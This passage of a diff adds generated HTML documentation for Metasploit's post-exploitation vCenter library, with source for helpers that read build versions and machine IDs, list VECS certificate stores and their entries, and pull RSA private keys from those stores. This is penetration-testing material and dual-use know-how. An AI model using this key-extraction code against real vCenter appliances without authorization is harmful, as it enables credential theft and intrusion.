+      <span class='id identifier rubyid_print_warning'>print_warning</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Unable to remove temporary file from vCenter appliance: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_temp_ldif_file'>temp_ldif_file</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='kw'>end</span>
+    <span class='kw'>return</span> <span class='kw'>nil</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_contents'>contents</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>^$\n</span><span class='regexp_end'>/</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_machine_id-instance_method">
+  
+    #<strong>get_machine_id</strong>(server_name = &#39;localhost&#39;)  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the machine-id (UUID) of a server by name</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>server_name</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+        <em class="default">(defaults to: <tt>&#39;localhost&#39;</tt>)</em>
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>server name to check. Defaults to 'localhost`</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>UUID of the machine's UUID</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+210
+211
+212
+213
+214</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 210</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_machine_id'>get_machine_id</span><span class='lparen'>(</span><span class='id identifier rubyid_server_name'>server_name</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>localhost</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_command_exists?'>command_exists?</span><span class='lparen'>(</span><span class='id identifier rubyid_vmafd_bin'>vmafd_bin</span><span class='rparen'>)</span>
+
+  <span class='kw'>return</span> <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_vmafd_bin'>vmafd_bin</span><span class='embexpr_end'>}</span><span class='tstring_content'> get-machine-id --server-name </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_server_name'>server_name</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_os_version-instance_method">
+  
+    #<strong>get_os_version</strong>  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Grabs the photon release and build number</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>, <tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of the photon release and build number</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+197
+198
+199
+200
+201
+202
+203</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 197</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_os_version'>get_os_version</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_file_exist?'>file_exist?</span><span class='lparen'>(</span><span class='id identifier rubyid_photon_version_file'>photon_version_file</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_os'>os</span> <span class='op'>=</span> <span class='id identifier rubyid_read_file'>read_file</span><span class='lparen'>(</span><span class='id identifier rubyid_photon_version_file'>photon_version_file</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_os'>os</span> <span class='op'>=</span> <span class='id identifier rubyid_os'>os</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_os'>os</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='comma'>,</span> <span class='id identifier rubyid_os'>os</span><span class='lbracket'>[</span><span class='int'>1</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>=</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>1</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_platform_service_controller-instance_method">
+  
+    #<strong>get_platform_service_controller</strong>(vc_type_management = false, host = &#39;localhost&#39;)  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns a string of the platform service controller used</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>vc_type_management</span>
+      
+      
+        <span class='type'>(<tt>Boolean</tt>)</span>
+      
+      
+        <em class="default">(defaults to: <tt>false</tt>)</em>
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>if the host is a vcenter manager or not</p>
+</div>
+      
+    </li>
+  
+    <li>
+      
+        <span class='name'>host</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+        <em class="default">(defaults to: <tt>&#39;localhost&#39;</tt>)</em>
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the host to determine the service controller for. localhost by default</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the fqdn of the service controller, nil on error</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+403
+404
+405
+406
+407
+408
+409
+410
+411
+412
+413
+414</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 403</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_platform_service_controller'>get_platform_service_controller</span><span class='lparen'>(</span><span class='id identifier rubyid_vc_type_management'>vc_type_management</span> <span class='op'>=</span> <span class='kw'>false</span><span class='comma'>,</span> <span class='id identifier rubyid_host'>host</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>localhost</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_command_exists?'>command_exists?</span> <span class='id identifier rubyid_vmafd_bin'>vmafd_bin</span>
+
+  <span class='kw'>unless</span> <span class='id identifier rubyid_vc_type_management'>vc_type_management</span>
+    <span class='kw'>return</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>localhost</span><span class='tstring_end'>&#39;</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_lookup_service'>lookup_service</span> <span class='op'>=</span> <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_vmafd_bin'>vmafd_bin</span><span class='embexpr_end'>}</span><span class='tstring_content'> get-ls-location --server-name </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_host'>host</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_ls_host'>ls_host</span> <span class='op'>=</span> <span class='const'>URI</span><span class='period'>.</span><span class='id identifier rubyid_parse'>parse</span><span class='lparen'>(</span><span class='id identifier rubyid_lookup_service'>lookup_service</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_host'>host</span><span class='period'>.</span><span class='id identifier rubyid_downcase'>downcase</span>
+  <span class='id identifier rubyid_print_warning'>print_warning</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>External Platform Service Controller Detected: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ls_host'>ls_host</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_ls_host'>ls_host</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_vcenter_build-instance_method">
+  
+    #<strong>get_vcenter_build</strong>  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>It returns the vcenter product banner and build number Cross reference <a href="https://knowledge.broadcom.com/external/article/326316/build-numbers-and-versions-of-vmware-vce.html">knowledge.broadcom.com/external/article/326316/build-numbers-and-versions-of-vmware-vce.html</a></p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of vcenter product banner and build number</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 124</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_vcenter_build'>get_vcenter_build</span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_command_exists?'>command_exists?</span><span class='lparen'>(</span><span class='id identifier rubyid_vpxd_bin'>vpxd_bin</span><span class='rparen'>)</span>
+    <span class='kw'>return</span> <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_vpxd_bin'>vpxd_bin</span><span class='embexpr_end'>}</span><span class='tstring_content'> -v</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_last'>last</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+  <span class='kw'>end</span>
+
+  <span class='comment'># this file may not be getting updated any longer. On vCenter 8.0.0.10000 it reads 6.5.0.0 Build 16197320
+</span>  <span class='kw'>if</span> <span class='id identifier rubyid_file_exist?'>file_exist?</span><span class='lparen'>(</span><span class='id identifier rubyid_manifest_file'>manifest_file</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_xml'>xml</span> <span class='op'>=</span> <span class='id identifier rubyid_read_file'>read_file</span><span class='lparen'>(</span><span class='id identifier rubyid_manifest_file'>manifest_file</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_xmldoc'>xmldoc</span> <span class='op'>=</span> <span class='const'>Nokogiri</span><span class='op'>::</span><span class='const'>XML</span><span class='lparen'>(</span><span class='id identifier rubyid_xml'>xml</span><span class='rparen'>)</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_config'>config</span><span class='op'>|</span>
+      <span class='id identifier rubyid_config'>config</span><span class='period'>.</span><span class='id identifier rubyid_options'>options</span> <span class='op'>=</span> <span class='const'>Nokogiri</span><span class='op'>::</span><span class='const'>XML</span><span class='op'>::</span><span class='const'>ParseOptions</span><span class='op'>::</span><span class='const'>STRICT</span> <span class='op'>|</span> <span class='const'>Nokogiri</span><span class='op'>::</span><span class='const'>XML</span><span class='op'>::</span><span class='const'>ParseOptions</span><span class='op'>::</span><span class='const'>NONET</span>
+    <span class='kw'>end</span>
+    <span class='kw'>return</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_xmldoc'>xmldoc</span><span class='period'>.</span><span class='id identifier rubyid_at_xpath'>at_xpath</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/update/product</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_text'>text</span><span class='embexpr_end'>}</span><span class='tstring_content'> </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_xmldoc'>xmldoc</span><span class='period'>.</span><span class='id identifier rubyid_at_xpath'>at_xpath</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/update/fullVersion</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_text'>text</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+  <span class='kw'>nil</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_vecs_entries-instance_method">
+  
+    #<strong>get_vecs_entries</strong>(vecs_store)  &#x21d2; <tt>Array</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns a list of hashes for the vecs store</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>vecs_store</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the store to get entries from</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Array</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of hashes, nil on error</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+302
+303
+304
+305
+306
+307
+308
+309
+310
+311
+312
+313
+314
+315
+316
+317
+318
+319
+320
+321
+322
+323
+324
+325
+326
+327
+328
+329
+330
+331
+332
+333
+334
+335
+336
+337
+338
+339</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 302</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_vecs_entries'>get_vecs_entries</span><span class='lparen'>(</span><span class='id identifier rubyid_vecs_store'>vecs_store</span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_command_exists?'>command_exists?</span> <span class='id identifier rubyid_vecs_bin'>vecs_bin</span>
+
+  <span class='id identifier rubyid_out'>out</span> <span class='op'>=</span> <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_vecs_bin'>vecs_bin</span><span class='embexpr_end'>}</span><span class='tstring_content'> entry list --store </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_vecs_store'>vecs_store</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>if</span> <span class='id identifier rubyid_out'>out</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+
+  <span class='comment'># time to process this beast. its roughly &quot; : &quot; delimited, but things like certificates are multi-line
+</span>  <span class='id identifier rubyid_delimiter'>delimiter</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'> :\t</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_output'>output</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_current_entry'>current_entry</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span>
+  <span class='id identifier rubyid_last_key'>last_key</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_out'>out</span> <span class='op'>=</span> <span class='id identifier rubyid_out'>out</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_out'>out</span><span class='period'>.</span><span class='id identifier rubyid_each'>each</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_line'>line</span><span class='op'>|</span>
+    <span class='comment'># handle anything that looks to be a continuation of the last key
+</span>    <span class='kw'>unless</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span> <span class='id identifier rubyid_delimiter'>delimiter</span>
+      <span class='id identifier rubyid_current_entry'>current_entry</span><span class='lbracket'>[</span><span class='id identifier rubyid_last_key'>last_key</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_current_entry'>current_entry</span><span class='lbracket'>[</span><span class='id identifier rubyid_last_key'>last_key</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>\n</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_line'>line</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+      <span class='kw'>next</span>
+    <span class='kw'>end</span>
+
+    <span class='id identifier rubyid_line'>line</span> <span class='op'>=</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='id identifier rubyid_delimiter'>delimiter</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_map'>map</span><span class='lparen'>(</span><span class='op'>&amp;</span><span class='symbol'>:strip</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_key'>key</span> <span class='op'>=</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_shift'>shift</span>
+    <span class='id identifier rubyid_value'>value</span> <span class='op'>=</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_join'>join</span><span class='lparen'>(</span><span class='id identifier rubyid_delimiter'>delimiter</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_last_key'>last_key</span> <span class='op'>=</span> <span class='id identifier rubyid_key'>key</span>
+    <span class='kw'>next</span> <span class='kw'>if</span> <span class='id identifier rubyid_key'>key</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Number of entries in store</span><span class='tstring_end'>&#39;</span></span> <span class='comment'># heading for output
+</span>
+    <span class='comment'># Alias is assumed first line of an entry, so append any non-blank previous entries to our output
+</span>    <span class='kw'>if</span> <span class='id identifier rubyid_key'>key</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Alias</span><span class='tstring_end'>&#39;</span></span> <span class='op'>&amp;&amp;</span> <span class='op'>!</span><span class='id identifier rubyid_current_entry'>current_entry</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
+      <span class='id identifier rubyid_output'>output</span><span class='period'>.</span><span class='id identifier rubyid_append'>append</span><span class='lparen'>(</span><span class='id identifier rubyid_current_entry'>current_entry</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_current_entry'>current_entry</span> <span class='op'>=</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_key'>key</span> <span class='op'>=&gt;</span> <span class='id identifier rubyid_value'>value</span> <span class='rbrace'>}</span>
+      <span class='kw'>next</span>
+    <span class='kw'>end</span>
+    <span class='id identifier rubyid_current_entry'>current_entry</span><span class='lbracket'>[</span><span class='id identifier rubyid_key'>key</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_value'>value</span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_output'>output</span><span class='period'>.</span><span class='id identifier rubyid_append'>append</span><span class='lparen'>(</span><span class='id identifier rubyid_current_entry'>current_entry</span><span class='rparen'>)</span> <span class='kw'>unless</span> <span class='id identifier rubyid_current_entry'>current_entry</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_output'>output</span>
+
+  <span class='kw'>nil</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_vecs_private_key-instance_method">
+  
+    #<strong>get_vecs_private_key</strong>(vecs_store, entry_alias)  &#x21d2; <tt>OpenSSL::PKey::RSA</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns a private key for an alias in a vecs store</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>vecs_store</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the store to get entries from</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>OpenSSL::PKey::RSA</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of content, nil on error</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+346
+347
+348
+349
+350
+351
+352
+353
+354
+355
+356</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 346</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_vecs_private_key'>get_vecs_private_key</span><span class='lparen'>(</span><span class='id identifier rubyid_vecs_store'>vecs_store</span><span class='comma'>,</span> <span class='id identifier rubyid_entry_alias'>entry_alias</span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_command_exists?'>command_exists?</span> <span class='id identifier rubyid_vecs_bin'>vecs_bin</span>
+
+  <span class='id identifier rubyid_key_b64'>key_b64</span> <span class='op'>=</span> <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_vecs_bin'>vecs_bin</span><span class='embexpr_end'>}</span><span class='tstring_content'> entry getkey --store </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_vecs_store'>vecs_store</span><span class='embexpr_end'>}</span><span class='tstring_content'> --alias </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_entry_alias'>entry_alias</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>begin</span>
+    <span class='kw'>return</span> <span class='const'>OpenSSL</span><span class='op'>::</span><span class='const'>PKey</span><span class='op'>::</span><span class='const'>RSA</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='id identifier rubyid_key_b64'>key_b64</span><span class='rparen'>)</span>
+  <span class='kw'>rescue</span> <span class='const'>OpenSSL</span><span class='op'>::</span><span class='const'>PKey</span><span class='op'>::</span><span class='const'>PKeyError</span>
+    <span class='kw'>nil</span>
+  <span class='kw'>end</span>
+  <span class='kw'>nil</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_vecs_stores-instance_method">
+  
+    #<strong>get_vecs_stores</strong>  &#x21d2; <tt>Array</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the list of stores from the vecs cli</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Array</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>of String stores, nil on error</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+288
+289
+290
+291
+292
+293
+294
+295</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 288</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_vecs_stores'>get_vecs_stores</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>unless</span> <span class='id identifier rubyid_command_exists?'>command_exists?</span> <span class='id identifier rubyid_vecs_bin'>vecs_bin</span>
+
+  <span class='id identifier rubyid_out'>out</span> <span class='op'>=</span> <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_vecs_bin'>vecs_bin</span><span class='embexpr_end'>}</span><span class='tstring_content'> store list</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='kw'>nil</span> <span class='kw'>if</span> <span class='id identifier rubyid_out'>out</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+
+  <span class='id identifier rubyid_out'>out</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="is_dn?-instance_method">
+  
+    #<strong>is_dn?</strong>(dn)  &#x21d2; <tt>Bool</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Function to determine if a dn is legitimate</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>dn</span>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>the string to determine if its a dn or not</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Bool</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>boolean if the string is a valid DN address</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+81
+82
+83
+84
+85</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/vcenter/vcenter.rb', line 81</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_is_dn?'>is_dn?</span><span class='lparen'>(</span><span class='id identifier rubyid_dn'>dn</span><span class='rparen'>)</span>
